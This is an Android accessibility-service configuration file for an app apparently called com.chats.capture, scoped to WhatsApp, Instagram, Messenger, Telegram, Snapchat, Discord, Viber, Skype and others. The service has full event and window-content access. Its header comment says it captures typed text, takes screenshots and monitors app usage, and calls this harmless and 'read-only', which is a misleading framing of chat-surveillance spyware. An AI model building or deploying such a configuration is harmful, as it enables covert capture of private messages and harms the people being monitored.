<?xml version="1.0" encoding="utf-8"?>
<!--
    Accessibility Service Configuration
    
    IMPORTANT: This service is READ-ONLY and does NOT interfere with other apps.
    
    What it does:
    - Monitors UI events (read-only)
    - Captures text input (read-only)
    - Takes screenshots (read-only)
    - Detects app usage (read-only)
    
    What it does NOT do:
    - Does NOT block or modify UI
    - Does NOT interfere with user interactions
    - Does NOT affect app performance
    - Does NOT modify files or data
    
    The service is limited to specific packages to minimize impact.
    All operations are passive and read-only.
-->
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/accessibility_service_description"
    android:packageNames="com.chats.capture,com.whatsapp,com.whatsapp.w4b,com.instagram.android,com.facebook.katana,com.facebook.orca,org.telegram.messenger,com.snapchat.android,com.twitter.android,com.discord,com.viber.voip,com.skype.raider"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagRetrieveInteractiveWindows|flagReportViewIds"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:notificationTimeout="0"
    android:canRetrieveWindowContent="true"
    android:canRequestFilterKeyEvents="false"
    android:settingsActivity="com.chats.capture.ui.MainActivity" />
